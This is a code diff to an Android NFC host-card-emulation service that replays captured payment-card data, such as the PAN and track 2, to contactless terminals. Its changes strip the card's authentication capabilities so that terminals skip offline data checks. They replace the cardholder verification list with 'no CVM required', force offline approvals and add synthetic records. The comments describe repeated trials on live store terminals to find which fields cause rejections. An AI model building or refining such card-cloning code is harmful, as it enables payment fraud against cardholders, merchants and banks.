@@ -40,6 +40,9 @@ public class ShadowApduService extends HostApduService {
      *   0x01 CDA supported        0x04 issuer authentication supported
      * 0x80 and 0x02 are RFU.
      *
+     * Byte 2 bit 8 (0x80) is the PayPass "EMV mode supported" marker - without
+     * it the kernel expects mag-stripe framing and will not read a 77 template.
+     *
      * 0x10 = CV only. No ODA of any kind, no TRM, no issuer auth - nothing for
      * the terminal to check and fail.
      */
@@ -80,17 +83,13 @@ public class ShadowApduService extends HostApduService {
     /**
      * AIP byte 1 bit 5 - cardholder verification supported.
      *
-     * PARKED, NOT APPLIED. Clearing it produced AIP 0800 and the terminal bailed
-     * on the GPO response without sending a single READ RECORD. With the bit set
-     * (AIP 1800) the same terminal reads all seven records. So the CV bit stays.
+     * STAYS SET. Clearing it produced AIP 0800 and the terminal bailed on the
+     * GPO response without sending a single READ RECORD; with the bit set the
+     * same terminal reads records. So the bit is kept even though the card now
+     * performs no CVM at all - the CV bit means "this card has a CVM list", not
+     * "a CVM must run".
      *
-     * The captured CVM list offers offline PIN and VERIFY here answers a bare
-     * 9000 without looking at the PIN block, but that is harmless: the card
-     * answers TC, so nothing validates the PIN and any digits are accepted.
-     *
-     * Kept declared so the experiment can be re-run by adding
-     *   tpl[..] &= (byte) ~AIP_CVM;
-     * next to each AIP_CDA line in weakenAip() and the one in gpo().
+     * The list itself is what decides. See CVMLIST.
      */
     private static final byte AIP_CVM = (byte) 0x10;
 
@@ -122,13 +121,12 @@ public class ShadowApduService extends HostApduService {
      *
      * Every terminal tried said "INSERT CARD" straight after the directory
      * response, at several stores and on a $2 amount, so they read the PPSE and
-     * refused the app before they ever sent SELECT AID. The AID and the encoding
-     * are valid, so the objection is to one of the optional fields: the 15-byte
-     * label or 9F2A = 02.
+     * refused the app before they ever sent SELECT AID.
      *
-     * With both gone the terminal has to decide on the AID alone. If one then
-     * selects, put the fields back ONE AT A TIME to find which it refused - the
-     * label first, then 9F2A.
+     * RESULT: with the label and 9F2A gone a terminal DID select the AID, ran
+     * the GPO, read a record and asked for a cryptogram. So one or both of those
+     * optional fields is what the directory readers choked on. Leave this true
+     * while other faults are being chased; restoring them is a separate bisect.
      */
     private static final boolean PPSE_MINIMAL = true;
 
@@ -156,10 +154,25 @@ public class ShadowApduService extends HostApduService {
     private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
     private static final String CDOL2   = "9F02069F03069F1A0295055F2A029A039C019F37049F3403";
 
-    private static final String CVMLIST = "00000000000000001E031F00";
+    /**
+     * CVM list: X = 0, Y = 0, one rule - 1F 03, "no CVM required, if the
+     * terminal supports it".
+     *
+     * WHY NOT ONLINE PIN (1E 03):
+     *   The card decides TC offline, so the terminal never opens an online
+     *   session - but an online-PIN rule says the card expects the PIN block
+     *   that only an online session produces. The kernel ends up with a CVM it
+     *   cannot perform and aborts with "error, insert card".
+     *
+     * A no-CVM card approves offline with nothing to collect. Any digits the
+     * terminal shows are ignored, which is fine: nothing validates them.
+     *
+     * The old value was 00000000000000001E031F00.
+     */
+    private static final String CVMLIST = "00000000000000001F03";
 
-    /** 9F34 CVM Results - no CVM required, if supported, successful. */
-    private static final String CVM_RESULTS = "1E0302";
+    /** 9F34 CVM Results - no CVM performed, if supported, unknown result. */
+    private static final String CVM_RESULTS = "1F0300";
 
     /**
      * Used when the selected card has no script of its own. One per line:
@@ -262,10 +275,9 @@ public class ShadowApduService extends HostApduService {
      * Local TLV writer, so the service no longer depends on how Tlv.t encodes
      * the length.
      *
-     * FIX: patchFci() wraps a whole captured FCI and buildPpse() wraps the whole
-     * directory, both of which can pass 127 bytes. A one-byte length there is
-     * simply wrong, and a wrong outer length on the FCI is exactly "the terminal
-     * read the app then stopped".
+     * The length is always taken from v.length, so an outer length can never
+     * disagree with the bytes it covers - which is what "the terminal read the
+     * app then stopped" usually is.
      */
     static byte[] tlv(int tag, byte[] v) {
         ByteArrayOutputStream o = new ByteArrayOutputStream();
@@ -355,8 +367,15 @@ public class ShadowApduService extends HostApduService {
         return "card" + prefs().getInt("selected", 0) + "_";
     }
 
+    /**
+     * FIX: this used getString, and SharedPreferences does no type coercion, so
+     * every pref MainActivity wrote with putInt (msd, usescript, atc...) threw
+     * ClassCastException the moment it was read here. Read the raw object and
+     * stringify, so either storage type works.
+     */
     private String p(String k, String d) {
-        String v = prefs().getString(sel() + k, d);
+        Object o = prefs().getAll().get(sel() + k);
+        String v = (o == null) ? null : o.toString();
         return (v == null || v.isEmpty()) ? d : v;
     }
 
@@ -365,7 +384,8 @@ public class ShadowApduService extends HostApduService {
     }
 
     private boolean isMsd() {
-        return prefs().getInt(sel() + "msd", 0) == 1;
+        String v = p("msd", "0").trim();
+        return v.equals("1") || v.equalsIgnoreCase("true") || v.equalsIgnoreCase("on");
     }
 
     // ---------- card fields, normalised once ----------
@@ -572,10 +592,7 @@ public class ShadowApduService extends HostApduService {
      * PPSE directory.
      *
      * BISECT BUILD - see PPSE_MINIMAL. The entry is 4F and 87 only: no label,
-     * no 9F2A kernel identifier. Terminals were reading this response and
-     * refusing the app without ever sending SELECT AID, so the optional fields
-     * are the suspects. With them gone the terminal must decide on the AID
-     * alone.
+     * no 9F2A kernel identifier.
      */
     private byte[] buildPpse() {
         String realAid = p("cap_aid", "");
@@ -756,6 +773,17 @@ public class ShadowApduService extends HostApduService {
         return hex(t);
     }
 
+    /**
+     * Synthetic SFI 1 record for a card with no capture.
+     *
+     * Tags in the order real cards use them. 9F07 (AUC) and 9F08 (application
+     * version) are included because a kernel-2 EMV record without a version
+     * number is a data-validation fault, and a validation fault is exactly an
+     * "error, insert card" fallback.
+     *
+     * 9F07 = FF00 allows every transaction type; nothing contactless reads it
+     * but its absence is noticed.
+     */
     private byte[] syntheticRecord() {
         String panS = pan();
         String expS = expiry6();
@@ -766,13 +794,15 @@ public class ShadowApduService extends HostApduService {
 
         return tlv(0x70, cat(
                 tlv(0x5A, hex(panS)),
-                tlv(0x5F34, hex(psnS)),
                 tlv(0x5F24, hex(expS)),
+                tlv(0x5F34, hex(psnS)),
                 h == null ? new byte[0] : tlv(0x5F20, h),
                 tlv(0x57, track2()),
                 tlv(0x8C, hex(CDOL1)),
                 tlv(0x8D, hex(CDOL2)),
-                tlv(0x8E, hex(CVMLIST))));
+                tlv(0x8E, hex(CVMLIST)),
+                tlv(0x9F07, hex("FF00")),
+                tlv(0x9F08, hex("0002"))));
     }
 
     @Override
@@ -935,9 +965,8 @@ public class ShadowApduService extends HostApduService {
      *   not have. Clearing the bit makes the terminal skip ODA entirely.
      *
      * WHY CVM STAYS:
-     *   Clearing it gave AIP 0800 and the terminal bailed. The captured CVM list
-     *   offers offline PIN and VERIFY answers a bare 9000, but the card answers
-     *   TC, so nothing validates the PIN and any digits are accepted.
+     *   Clearing the CV bit gave AIP 0800 and the terminal bailed. The CVM list
+     *   itself is now no-CVM - see CVMLIST.
      *
      * The changes are made by mutating the captured template in place, not by
      * rebuilding it, so any extra tags the card put in its GPO response survive.
@@ -1193,6 +1222,9 @@ public class ShadowApduService extends HostApduService {
      * FIX: the flags were tested BEFORE the request, so a terminal asking for
      * AAC (P1 0x00) was handed TC. CID severity runs AAC < ARQC < TC and a card
      * may only answer equal or lower - never better than it was asked.
+     *
+     * The body is assembled into its own array and its length logged, so the
+     * outer 77 length and the bytes it covers can be compared at a glance.
      */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
@@ -1243,12 +1275,17 @@ public class ShadowApduService extends HostApduService {
                 + (forced.length() == 2 ? " (forced from the CID box)" : "")
                 + " atc=" + atc + " arqc=" + bytesToHex(ac));
 
-        return cat(tlv(0x77, cat(
+        byte[] body = cat(
                 tlv(0x9F10, hex(iad)),
                 tlv(0x9F26, ac),
                 tlv(0x9F27, new byte[]{cid}),
                 tlv(0x9F34, hex(CVM_RESULTS)),
-                tlv(0x9F36, hex(atc)))), SW_OK);
+                tlv(0x9F36, hex(atc)));
+
+        tap("-- genac body=" + body.length + "B iad=" + hex(iad).length
+                + "B arqc=" + ac.length + "B cvm=" + hex(CVM_RESULTS).length + "B");
+
+        return cat(tlv(0x77, body), SW_OK);
     }
 
     private byte[] computeAc(String atc, byte[] cdol) {
